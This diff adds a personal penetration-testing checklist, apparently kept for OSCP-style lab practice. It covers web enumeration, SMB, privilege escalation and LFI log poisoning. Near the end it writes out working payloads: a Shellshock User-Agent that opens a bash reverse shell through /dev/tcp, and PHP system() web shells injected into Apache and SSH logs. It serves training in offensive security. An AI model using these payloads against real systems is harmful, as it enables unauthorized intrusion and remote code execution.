@@ -1,0 +1,121 @@
+RECON
+1. http://207.246.89.123/index.html#video-path=media/video/PE_01_00.mp4&time-offset=71
+2. https://help.offensive-security.com/hc/en-us
+
+PORT 80
+	1. gobuster (medium + extensions) (also RECURSIVELY)
+			1.1 directories
+				-->directories --> 1. directory-medium.2-3 (220560) 
+ 				
+ 				2. /usr/share/seclists/web-content/common.txt (or search any other in seclists) (4658)
+ 				
+ 				3. dirb/big.txt (20469)
+ 				
+ 				4. /usr/share/seclists/web-content/raft....
+ 			
+ 				5. /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt (when nothing else works) (1273833)
+ 				6. wordlist for password :  /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt
+ 				
+	2. nikto -h
+	3. check if any cookie is set
+	4. page source (scroll all the way down even if it seems empty)
+	5. download image and exiftool
+	6. any CMS
+			--> default creds
+			--> look for admin-login and creds
+			--> any known vulnerability 
+			--> look for exploits 
+	7. know vuln. of running service 
+	8. Login page
+			--> sqli
+			--> page source
+			--> imf wali cheez  (php strcmp vuln. )
+	9. nmap scripts  
+			--> nmap --script (script category such as exploit/discovery/auth) IP 
+			--> to know how a script works, first identify the script and then open it up to see the usage 
+	10. tcpdump/wireshark to see if any traffic is running between you two
+	11. if you see any application (like opendocman) loook for its source code on github
+	12. while doing command injection, first directly put the command for reverse shell and if it does not work then try encoding the WHOLE PARAMETER. and then get shell!
+	13. whenever you find lfi, try different wrappers
+	14. when lfi found, then try to also see the configuration files of apache, if not sure about their location then search it online or if its debian based then check the location on your system itself
+	15. keep your eyes open, for on which directories the request is being sent by analyzing the first request to /index. in burp (like in node, it was going to /assets and /api as well)
+	16. if you are not getting anyting from requests of browser or getting the same thing but gettng certain results from tools like ffuf or gobuster then surely it has somethign to do with user-agent (node)
+					-->  If-None-Match 
+					--> If-Modified-Since	
+					--> sometimes these headers cause 304 not modified
+	17. if you directly appear to find something 2-3 level down a directory like "/api/users/latest" then check also whats up the directory liek "/api/users" and stuff
+	18. first look for exploits on searchsploit then go to google
+	19. when you find /cgi-bin directory do two things to ensure shell-shock
+			--> do further direcotry bruteforce for a while with extension sh,pl (shocker)
+			--> normal dirctory bruteforce (symfonos 3)
+	20. while bruteforcing a login form with ffuf 
+			--> first try filtering acc to lines  (-fl) and words (-fw)
+			--> if you dont get anything on lines, then try filtering with words
+			--> dont prefer status code (-fc 200) as much as possible
+	21. when it feels like you have reached a deadend while doing director bruteforce i.e. nothing comes out, try send the request of gobuster in burp , and then if its showing same 200 code for everyrequest, set gobuster to view responses other than 200 (-s option)
+		(bart machine HTB)
+
+PORT 139,445
+	1. use smbclient //IP/ (to check shares on anonymous login)
+	2. use smbmap -h IP -u 'user' -p 'password' (when you have creds)
+	3. use nmap scripts for enumeration
+				1. user-enum
+				2. share enum (and then search likewise)
+
+
+GENERAL :
+	1. try creds everywhere 
+	
+	2. there is an art of searching for exploit. Don't just stop if you   	 find any exploit of the exact version on exploitdb even if its 	   VERIFIED.
+	for e.g. you searched for openemr 4.1.0 exploits -->  you got sqli --> you tried that --> it doesn't work or it requires authentication. 
+	now at this point, dont stop or start looking for other exploits. Rather search for "openemr 4.1.0 sql injection" chances are you may find something of use. Like in healthcare...the netsparker wali link.?
+	The bottom line is, its not necessary that you will find working exploits on exploit-db and github only, there are plenty of sources out there. you just need to keep your eyes open and mind broad! 
+	
+	3. try random words as directory on web
+
+	4. this is new and interesting, if you are downloading just text files from ftp, then its fine, do it the usual way but if you are transferring a non-text file (e.g. binary, image, pcap )..then switch the transfer mode to binary and then proceed
+
+	5. use "content-type" header in ffuf 
+	6. if you seee any service running on target but that port is not exposed to external network then keep PROXYCHAINS in mind provided, it should have a proxy service runnin on it! 
+	7. when you have rce, but cant get the connection back, then try to look for not-so-common services on the box 
+		--> ss -nltup (to get the ports)
+		--> ls -al /etc/ (to see possible services and their config files for e.g. knockd,tfpt)
+		--> ls -al /etc/init.d (default config files) 
+	8. if you see dns/53 running on tcp, then go for zone transers 
+		--> dig axfr IP @dns-server
+		--> dig axfr cronos.htb @10.10.10.13
+		--> host -l IP dns-server (host -l )
+	9. whenever you find anything relatd to cgi such as .cgi file or cgi-XXX related directory
+		--> try shellshock in user-agent 
+		--> User-Agent: () { :; };ping -c 1 10.10.14.2
+		--. User-Agent: () { :; };bash -i >& /dev/tcp/10.10.14.2/8081 0>&1
+	10. file upload, cheatsheet
+		--> https://thehacktoday.com/bypass-file-upload-restrictions-on-web-apps-to-pop-a-shell/
+		--> http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html#blacklisting-bypass
+		
+PRIVESC:
+	first off, general checks should be done. these are mandatory. THese has to be done no matter what. PERIOD!
+
+	1. suid
+	2. sudo -l
+	3. pspy64 (look for processes rnning , and files they are utilising and if we have write permssion on that)
+	4. writable files owned by other users
+	5. run linpeas 
+				--> be watchfull on the presence of 'password' in log files
+	6. if its listening on other ports locally  ---> ssh tunneling
+	7. any vulnerable software 
+			--> exim, sudo 
+	8. kernel exploit
+	9. use chisel for port forwarding : authentication not requred
+
+
+LOG POISONING : (lfi --> rce)
+in all the below cases, first find check if you have read permission on the log files 
+	1. http-log poisoning 
+		User-Agent: 0xdf: <?php system($_GET['c']); ?>
+			then check access.log
+	2. ssh log poisoning
+		ssh '<?php system($_GET['c']); ?>'@192.168.1.129
+			then check auth.log
+	3. mail log poisoning
+		https://www.hackingarticles.in/smtp-log-poisioning-through-lfi-to-remote-code-exceution/
